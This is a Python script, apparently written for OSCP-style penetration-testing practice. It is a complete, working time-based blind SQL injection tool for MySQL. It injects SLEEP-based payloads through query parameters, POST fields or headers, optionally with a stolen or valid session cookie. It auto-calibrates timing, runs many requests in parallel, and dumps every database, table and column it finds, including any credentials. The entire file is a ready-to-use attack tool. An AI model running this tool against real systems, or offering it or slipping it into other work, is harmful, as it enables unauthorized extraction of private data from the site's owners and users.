#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# Time-based blind SQLi dumper (MySQL) - interactive, auto-calibrating, threaded
# Oracle = RESPONSE TIME. A condition is wrapped so the DB sleeps when TRUE:
# slow reply (>= threshold) = TRUE, instant reply = FALSE.
#
# Methods: GET (query string), POST (body), HEADER (e.g. X-Forwarded-For).
# Optional session cookie for endpoints that require an authenticated session.
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Interactive config ----------------------------------------------------
print("=== time-based SQLi dumper ===")
METHOD       = input("Request method GET, POST or HEADER           : ").strip().upper()
if METHOD not in ("GET", "POST", "HEADER"):
    METHOD = "GET"
URL          = input("Target URL                                   : ").strip()
# For GET/POST this is the param name (e.g. id). For HEADER it is the header
# name whose value is logged into a query (e.g. X-Forwarded-For).
INJ_FIELD    = input("Injectable field/header name                 : ").strip()
OTHER_FIELD  = input("Other POST field name (blank if none)        : ").strip() if METHOD == "POST" else ""
OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() if OTHER_FIELD else ""
# Template with [INJECT] where the sleep expression is spliced in. It only
# needs the break-out; the wrapper (IF/SLEEP) is added and auto-picked for you.
# SELECT context (login/id):  1' OR [INJECT]-- -   or   admin' AND [INJECT]-- -
# HEADER/INSERT context:      1' AND [INJECT]-- -
TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()

# --- Optional session cookie ----------------------------------------------
# Name prompt has a default; pressing Enter uses it. Value prompt takes the
# raw cookie value only (no "name=" prefix). Blank value -> run without a cookie.
COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() or "token"
COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()

# Auto mode samples the target and derives DELAY from the measured jitter.
# Enter a number instead to force a fixed value - use that when the box is
# unstable enough that the sampling itself is unreliable.
_delay_in    = input("SLEEP seconds on TRUE (y = auto, or a number): ").strip().lower()
AUTO_DELAY   = _delay_in in ("", "y", "yes", "auto", "a")
DELAY        = None if AUTO_DELAY else float(_delay_in)
THREADS      = int(input("Threads (e.g. 8; lower if box is fragile)    : ").strip() or "8")

# Filled in by calibrate_timing(). THRESHOLD splits TRUE from FALSE; the gray
# band around it marks readings too close to call, which get re-measured.
THRESHOLD    = None
GRAY_LO      = None
GRAY_HI      = None
BASE_P95     = None

# One session reused for every request (across all threads). The cookie (if
# set) rides along automatically in the Cookie header on each request.
SESSION = requests.Session()
if COOKIE_VALUE:
    SESSION.cookies.set(COOKIE_NAME, COOKIE_VALUE)

# --- Wrapper forms tried during calibration (first that fires wins) --------
# Each turns a boolean {cond} into "sleep DELAY seconds iff cond is TRUE".
# Ordered from most common context to most specialised.
WRAPPERS = [
    "IF(({cond}),SLEEP({d}),0)",                       # bare - SELECT ... WHERE
    "(SELECT IF(({cond}),SLEEP({d}),0))",              # subquery - INSERT/header
    "(SELECT IF(({cond}),SLEEP({d}),0) FROM DUAL)",    # subquery + FROM DUAL
    "(SELECT IF(({cond}),SLEEP({d}),0) FROM information_schema.tables LIMIT 1)",
    "ELT(({cond}),SLEEP({d}))",                        # ELT fires arg when cond=1
]

# --- Request sender (GET -> query, POST -> body, HEADER -> header) ----------
# Runs over SESSION so the cookie is attached when one was provided. The
# session's connection pool is thread-safe for concurrent requests, and here
# the cookie jar is only read (never mutated mid-run), so sharing one session
# across the thread pool is safe.
def send(payload):
    if METHOD == "HEADER":
        return SESSION.get(URL, headers={INJ_FIELD: payload})
    if METHOD == "GET":
        params = {INJ_FIELD: payload}
        if OTHER_FIELD:
            params[OTHER_FIELD] = OTHER_VALUE
        return SESSION.get(URL, params=params)
    data = {INJ_FIELD: payload}
    if OTHER_FIELD:
        data[OTHER_FIELD] = OTHER_VALUE
    return SESSION.post(URL, data=data)

def build(cond, wrapper):
    return TEMPLATE.replace("[INJECT]", wrapper.format(cond=cond, d=DELAY))

def timed(cond, wrapper):
    start = time.time()
    send(build(cond, wrapper))
    return time.time() - start

# --- Timing calibration: measure the noise floor, then size DELAY to it -----
# Samples are taken at the real THREADS concurrency, because a box that is
# calm single-threaded can be much noisier once the pool is hammering it.
# The no-op payload splices 0 in place of [INJECT], so it is valid in every
# context and never sleeps - it measures pure round-trip time.
def sample_baseline(n):
    payload = TEMPLATE.replace("[INJECT]", "0")
    def one(_):
        start = time.time()
        try:
            send(payload)
        except Exception:
            return None
        return time.time() - start
    samples = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for r in ex.map(one, range(n)):
            if r is not None:
                samples.append(r)
    return sorted(samples)

def calibrate_timing():
    global DELAY, THRESHOLD, GRAY_LO, GRAY_HI, BASE_P95
    n = max(12, THREADS * 2)
    print(f"\n[*] Sampling baseline RTT ({n} requests at {THREADS} threads)...")
    s = sample_baseline(n)
    if len(s) < 4:
        print("[!] Baseline sampling failed (target unreachable?). Aborting.")
        sys.exit(1)
    med = s[len(s) // 2]
    p95 = s[min(len(s) - 1, int(len(s) * 0.95))]
    # Jitter is the spread above the median, floored so a suspiciously quiet
    # sample run cannot collapse DELAY to something unusable.
    jitter = max(p95 - med, 0.05)
    if AUTO_DELAY:
        DELAY = round(max(0.5, 4 * jitter), 2)
    # A TRUE lands near p95 + DELAY, a FALSE at or below p95. Split the gap.
    BASE_P95  = p95
    THRESHOLD = p95 + DELAY * 0.5
    GRAY_LO   = p95 + DELAY * 0.3
    GRAY_HI   = p95 + DELAY * 0.7
    print(f"[+] baseline: median {med:.3f}s  p95 {p95:.3f}s  jitter {jitter:.3f}s")
    print(f"[+] DELAY {DELAY:.2f}s ({'auto' if AUTO_DELAY else 'manual'})  "
          f"threshold {THRESHOLD:.3f}s  gray band {GRAY_LO:.3f}-{GRAY_HI:.3f}s")

# --- Calibration: pick the wrapper that actually delays --------------------
CHOSEN = None
def calibrate_wrapper():
    global CHOSEN
    for w in WRAPPERS:
        try:
            true_slow  = timed("1=1", w) >= THRESHOLD   # TRUE must sleep
            false_fast = timed("1=2", w) <  THRESHOLD   # FALSE must not
        except Exception:
            continue
        if true_slow and false_fast:
            CHOSEN = w
            return w
    return None

calibrate_timing()

# If the auto DELAY sits too close to the noise, the wrapper check fails even
# on a perfectly injectable parameter. Back off and retry before giving up.
print("\n[*] Calibrating wrapper (sends a few DELAY-second requests)...")
for attempt in range(3):
    if calibrate_wrapper():
        break
    if attempt < 2 and AUTO_DELAY:
        DELAY = round(DELAY * 2, 2)
        THRESHOLD = BASE_P95 + DELAY * 0.5
        GRAY_LO   = BASE_P95 + DELAY * 0.3
        GRAY_HI   = BASE_P95 + DELAY * 0.7
        print(f"[*] No wrapper fired - raising DELAY to {DELAY:.2f}s and retrying...")
if not CHOSEN:
    print("[!] No wrapper fired. TRUE never delayed or FALSE also delayed.")
    print("    - Check the template breaks out of the query correctly.")
    print("    - HEADER values must use real spaces, never + or %20.")
    print("    - If the endpoint needs auth, check the cookie name/value.")
    print("    - The parameter may simply not be injectable here.")
    print("    - If the box is heavily loaded, rerun and set DELAY manually.")
    print(f"    method   = {METHOD}")
    print(f"    template = {TEMPLATE!r}")
    print(f"    delay    = {DELAY}s, threshold = {THRESHOLD:.3f}s")
    print(f"    cookie   = {COOKIE_NAME}={'(set)' if COOKIE_VALUE else '(none)'}")
    sys.exit(1)
print(f"[+] Using wrapper: {CHOSEN}\n")

# MySQL system schemas to skip when dumping "all" (still listed on screen)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

# --- Core oracle + extraction ----------------------------------------------
def oracle(condition, tries=3):
    """One boolean question -> True if the reply was delayed.
    A reading outside the gray band is decisive and returns immediately.
    Anything inside it is noise, so re-measure and take the majority."""
    votes = 0
    seen = 0
    for _ in range(tries):
        start = time.time()
        send(build(condition, CHOSEN))
        elapsed = time.time() - start
        if elapsed >= GRAY_HI:
            return True
        if elapsed <= GRAY_LO:
            return False
        seen += 1
        if elapsed >= THRESHOLD:
            votes += 1
    return votes * 2 > seen

# Cheap probes run before any binary search. FALSE costs one RTT, TRUE costs a
# full DELAY, so each probe is phrased so the likely answer is FALSE - except
# the comma, which is worth one direct hit because group_concat output is full
# of them and it resolves the byte in a single question.
FAST_SINGLES = [44]                          # ,
FAST_RANGES  = [(97, 122), (48, 57), (65, 90)]   # a-z, 0-9, A-Z

def bsearch(expr, lo, hi):
    """Binary search a byte value inside an inclusive range."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"{expr}>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_char(subquery, pos):
    """Resolve the byte at position pos, narrowing with cheap probes first.
    A lowercase byte costs one FALSE plus a 26-value search (~2.5 sleeps)
    instead of a full 0-255 search (~4 sleeps)."""
    expr = f"ascii(substring(({subquery}),{pos},1))"
    for v in FAST_SINGLES:
        if oracle(f"{expr}={v}"):
            return v
    for lo, hi in FAST_RANGES:
        if not oracle(f"{expr} NOT BETWEEN {lo} AND {hi}"):
            return bsearch(expr, lo, hi)
    return bsearch(expr, 0, 255)

def get_length(subquery):
    """Binary search the length of the result (so threads know how many chars)."""
    lo, hi = 0, 4096
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"length(({subquery}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

# --- Integrity check + repair ----------------------------------------------
# One question confirms a whole segment, so a bad byte anywhere is caught for
# the price of a single sleep. UNHEX keeps quotes out of the payload entirely,
# and BINARY forces a byte-exact compare regardless of collation.
def segment_ok(subquery, buf, lo, hi):
    h = bytes(buf[lo:hi]).hex()
    return oracle(f"BINARY(substring(({subquery}),{lo+1},{hi-lo}))=UNHEX('{h}')")

def _fix(subquery, buf, lo, hi):
    if segment_ok(subquery, buf, lo, hi):
        return 0
    if hi - lo == 1:
        buf[lo] = bsearch(f"ascii(substring(({subquery}),{lo+1},1))", 0, 255)
        return 1
    mid = (lo + hi) // 2
    return _fix(subquery, buf, lo, mid) + _fix(subquery, buf, mid, hi)

def repair(subquery, buf):
    """Verify the dump against the DB; bisect to any bad byte and re-read it.
    Returns (ok, number_of_bytes_fixed)."""
    fixed = 0
    for _ in range(3):
        if segment_ok(subquery, buf, 0, len(buf)):
            return True, fixed
        fixed += _fix(subquery, buf, 0, len(buf))
    return segment_ok(subquery, buf, 0, len(buf)), fixed

_print_lock = threading.Lock()
def extract_string(subquery, label=None):
    """Find the length, then dump every character position in parallel.
    Threads make time-based practical; order is restored by index. Bytes are
    kept as ints so a failed read can never shorten the buffer and shift
    everything after it - the old silent-drop failure mode."""
    n = get_length(subquery)
    if n == 0:
        if label is not None:
            sys.stdout.write(f"{label}\n")
        return ""
    buf = [0] * n
    done = 0
    def work(i):
        buf[i] = extract_char(subquery, i + 1)
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(work, i): i for i in range(n)}
        for _ in as_completed(futures):
            if label is not None:
                done += 1
                with _print_lock:
                    sys.stdout.write(f"\r{label}{done}/{n} chars")
                    sys.stdout.flush()
    ok, fixed = repair(subquery, buf)
    s = bytes(buf).decode("utf-8", "replace")
    if label is not None:
        note = ""
        if fixed:
            note = f"  [repaired {fixed}]"
        if not ok:
            note += "  [UNVERIFIED]"
        sys.stdout.write(f"\r{label}{s}{note}{' ' * 8}\n")
    return s

# --- ASCII table renderer --------------------------------------------------
def render_table(headers, rows):
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            cell = row[i] if i < len(row) else ""
            widths[i] = max(widths[i], len(cell))
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
        return "| " + " | ".join(cells) + " |"
    print("      " + bar)
    print("      " + fmt(headers))
    print("      " + bar)
    for row in rows:
        print("      " + fmt(row))
    print("      " + bar)

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = extract_string(q, label="[*] databases: ")
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = extract_string(q, label=f"[*] tables in {db}: ")
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = extract_string(q, label=f"[*] columns in {db}.{table}: ")
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"      (no columns found for {db}.{table})")
        return
    # One single-arg group_concat per column - same shape that dumps names.
    # (Caveat: a value containing a comma would misalign that column.)
    columns_data = []
    for c in cols:
        q = f"SELECT group_concat({c}) FROM {db}.{table}"
        s = extract_string(q, label=f"    {c}: ")
        columns_data.append(s.split(",") if s else [])
    n = max((len(cd) for cd in columns_data), default=0)
    rows = [[cd[i] if i < len(cd) else "" for cd in columns_data] for i in range(n)]
    print()
    render_table(cols, rows)

# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"   {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("   invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")

    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")

    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        tables = get_tables(db)
        if not tables:
            print("    (no tables)")
            continue
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")

        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)

    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
